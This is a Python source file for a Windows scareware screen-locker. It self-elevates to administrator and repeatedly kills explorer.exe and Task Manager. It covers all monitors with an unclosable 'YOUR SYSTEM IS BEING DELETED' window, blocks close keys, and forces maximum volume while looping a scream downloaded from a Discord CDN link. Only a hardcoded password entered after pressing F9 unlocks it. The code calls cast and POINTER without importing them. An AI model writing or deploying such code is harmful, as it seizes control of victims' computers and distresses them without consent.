import threading
import time
import requests
import tempfile
import psutil
import pygetwindow as gw
from playsound import playsound
from ctypes import windll
from comtypes import CLSCTX_ALL, CoInitialize
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import sys
import os
import tkinter as tk
from tkinter import simpledialog, messagebox
import keyboard  
import subprocess

def run_as_admin():
    if not windll.shell32.IsUserAnAdmin():
        params = " ".join([f'"{arg}"' for arg in sys.argv])
        windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
        sys.exit()

def enforce_volume_and_unmute():
    CoInitialize()
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    while True:
        try:
            volume.SetMute(0, None)
            volume.SetMasterVolumeLevelScalar(1.0, None)
        except Exception:
            pass
        time.sleep(0.5)

def kill_explorer():
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] and proc.info['name'].lower() == 'explorer.exe':
            try:
                proc.kill()
            except Exception:
                pass

def kill_task_manager():
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] and proc.info['name'].lower() == 'taskmgr.exe':
            try:
                proc.kill()
            except Exception:
                pass

def close_windows_key_overlays():
    overlay_titles = [
        "start", "start menu", "windows", "taskbar", "action center"
    ]
    for w in gw.getAllWindows():
        try:
            title = w.title.lower()
            if any(key in title for key in overlay_titles):
                w.close()
        except Exception:
            pass

def monitor_and_close_overlays():
    while True:
        kill_explorer()
        kill_task_manager()
        close_windows_key_overlays()
        time.sleep(1)

def show_troll_popup_all_monitors(stop_event):

    import screeninfo
    monitors = screeninfo.get_monitors()
    windows = []

    def on_closing():

        pass

    for mon in monitors:
        root = tk.Tk()
        root.attributes("-topmost", True)
        root.protocol("WM_DELETE_WINDOW", on_closing)
        root.configure(bg='black')

        root.geometry(f"{mon.width}x{mon.height}+{mon.x}+{mon.y}")
        root.overrideredirect(True)  

        label = tk.Label(
            root,
            text="YOUR SYSTEM IS BEING DELETED",
            font=("Helvetica", 40, "bold"),
            fg="red",
            bg="black"
        )
        label.pack(expand=True)

        root.bind("<Alt-F4>", lambda e: "break")
        root.bind("<Escape>", lambda e: "break")
        root.bind("<Control-w>", lambda e: "break")

        windows.append(root)

    def loop():
        if stop_event.is_set():
            for w in windows:
                w.destroy()
            return
        for w in windows:
            w.update()
        root.after(50, loop)

    root.after(50, loop)
    root.mainloop()

def password_prompt(stop_event):

    prompt = tk.Tk()
    prompt.title("Password Required")
    prompt.attributes("-topmost", True)
    prompt.geometry("400x150")
    prompt.resizable(False, False)
    prompt.configure(bg='black')

    def on_submit():
        pwd = entry.get()
        if pwd == "Esorlexismyking":

            stop_event.set()
            prompt.destroy()

            subprocess.Popen("explorer.exe")

            os._exit(0)
        else:
            messagebox.showerror("Error", "Incorrect Password")
            entry.delete(0, tk.END)

    label = tk.Label(prompt, text="Enter Password:", font=("Helvetica", 14), fg="white", bg="black")
    label.pack(pady=10)
    entry = tk.Entry(prompt, show="*", font=("Helvetica", 14))
    entry.pack(pady=5)
    entry.focus()

    submit_btn = tk.Button(prompt, text="Submit", command=on_submit)
    submit_btn.pack(pady=10)

    prompt.mainloop()

def listen_for_f9(stop_event):
    while not stop_event.is_set():
        if keyboard.is_pressed('F9'):

            password_prompt(stop_event)
            time.sleep(1)  

def main():
    run_as_admin()

    stop_event = threading.Event()

    threading.Thread(target=enforce_volume_and_unmute, daemon=True).start()
    threading.Thread(target=monitor_and_close_overlays, daemon=True).start()

    threading.Thread(target=show_troll_popup_all_monitors, args=(stop_event,), daemon=True).start()

    threading.Thread(target=listen_for_f9, args=(stop_event,), daemon=True).start()

    url = "https://cdn.discordapp.com/attachments/1296591481468878929/1394049253130764358/scream-made-with-Voicemod.mp3?ex=68775f4a&is=68760dca&hm=32a62210d145a2be1936e10b5aae4cf761c1511c6e68bf425d51d33fa94932ab&"
    with tempfile.NamedTemporaryFile(delete=False, suffix=".mp3") as temp_file:
        temp_file.write(requests.get(url).content)
        mp3_path = temp_file.name

    while True:
        try:
            playsound(mp3_path)
        except Exception:
            pass
        if stop_event.is_set():
            break

if __name__ == "__main__":
    main()